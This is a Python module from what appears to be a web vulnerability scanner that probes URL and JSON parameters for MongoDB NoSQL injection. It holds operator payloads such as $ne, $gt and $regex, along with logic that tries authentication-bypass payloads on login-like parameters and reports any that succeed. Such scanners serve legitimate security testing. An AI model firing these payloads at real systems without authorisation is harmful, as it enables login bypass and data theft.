"""
NoSQL Injection detection module.
Tests MongoDB operator injection, authentication bypass, data extraction.
Based on 2018-2025 research.
"""
import json
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from .base import BaseModule
from ..core.reporter import Finding
from ..payloads.sqli_errors import (
    NOSQL_MONGODB_AUTH_BYPASS,
    NOSQL_MONGODB_EXTRACTION,
)


class NoSQLiModule(BaseModule):
    name = "nosqli"
    description = "NoSQL Injection (MongoDB, Redis, Elasticsearch)"

    OPERATOR_PAYLOADS_URL = [
        ("[$ne]", "x"),
        ("[$gt]", ""),
        ("[$regex]", ".*"),
        ("[$exists]", "true"),
        ("[$nin][]", "x"),
    ]

    JSON_PAYLOADS = [
        {"$ne": ""},
        {"$gt": ""},
        {"$regex": ".*"},
        {"$exists": True},
        {"$in": ["admin", "root", "test"]},
    ]

    def run(self, url: str, params: dict = None):
        self.log(f"Testing: {url}")
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query, keep_blank_values=True)

        if params:
            query_params.update({k: [v] for k, v in params.items()})

        if not query_params:
            self.log("No parameters to test")
            return

        for param_name in query_params:
            self.log(f"Testing param: {param_name}")
            self._test_operator_injection(url, parsed, query_params, param_name)
            self._test_json_injection(url, parsed, query_params, param_name)
            self._test_auth_bypass(url, parsed, query_params, param_name)

    def _test_operator_injection(self, url, parsed, query_params, param_name):
        baseline = self.http.get(url)
        if not baseline:
            return

        for op_suffix, op_value in self.OPERATOR_PAYLOADS_URL:
            modified = dict(query_params)
            modified[f"{param_name}{op_suffix}"] = [op_value]
            if param_name in modified:
                del modified[param_name]
            query_string = urlencode({k: v[0] for k, v in modified.items()})
            test_url = urlunparse(parsed._replace(query=query_string))

            resp = self.http.get(test_url)
            if not resp:
                continue

            if resp.status_code == 200 and resp.text != baseline.text:
                if len(resp.text) > len(baseline.text) * 1.5 or resp.text.count("{") > baseline.text.count("{") + 3:
                    self.reporter.add(Finding(
                        vuln_type="NoSQL Injection (Operator)",
                        severity="HIGH",
                        url=url,
                        parameter=param_name,
                        payload=f"{param_name}{op_suffix}={op_value}",
                        evidence=f"Response changed: {len(baseline.text)} -> {len(resp.text)} bytes",
                        details="MongoDB operator injection. Data extraction possible.",
                    ))
                    return

    def _test_json_injection(self, url, parsed, query_params, param_name):
        baseline = self.http.get(url)
        if not baseline:
            return

        content_type = baseline.headers.get("Content-Type", "")
        if "json" not in content_type and "application/x-www-form-urlencoded" not in content_type:
            return

        for json_payload in self.JSON_PAYLOADS:
            body = {}
            for k, v in query_params.items():
                body[k] = v[0]
            body[param_name] = json_payload

            resp = self.http.request("POST", url, json=body)
            if not resp:
                continue

            if resp.status_code == 200 and resp.text != baseline.text:
                if len(resp.text) > len(baseline.text) * 1.3:
                    self.reporter.add(Finding(
                        vuln_type="NoSQL Injection (JSON Operator)",
                        severity="HIGH",
                        url=url,
                        parameter=param_name,
                        payload=json.dumps(json_payload),
                        evidence=f"Response changed with JSON operator: {len(resp.text)} bytes",
                        details="MongoDB JSON operator injection via POST body.",
                    ))
                    return

    def _test_auth_bypass(self, url, parsed, query_params, param_name):
        if not any(p in query_params for p in ["username", "user", "login", "email", "password", "pass", "pwd"]):
            return

        for payload, payload_type in NOSQL_MONGODB_AUTH_BYPASS:
            if payload_type == "urlencoded":
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{payload}"
                resp = self.http.get(test_url)
            else:
                resp = self.http.request(
                    "POST",
                    url,
                    data=payload,
                    headers={"Content-Type": "application/json"},
                )
            if not resp:
                continue

            if resp.status_code in (200, 302):
                auth_indicators = ["dashboard", "welcome", "profile", "admin", "logout", "session", "token"]
                for ind in auth_indicators:
                    if ind.lower() in resp.text.lower():
                        self.reporter.add(Finding(
                            vuln_type="NoSQL Auth Bypass",
                            severity="CRITICAL",
                            url=url,
                            payload=payload[:80] + "..." if len(payload) > 80 else payload,
                            evidence=f"Auth indicator found: {ind}",
                            details=f"MongoDB authentication bypass via {payload_type} operator injection.",
                        ))
                        return
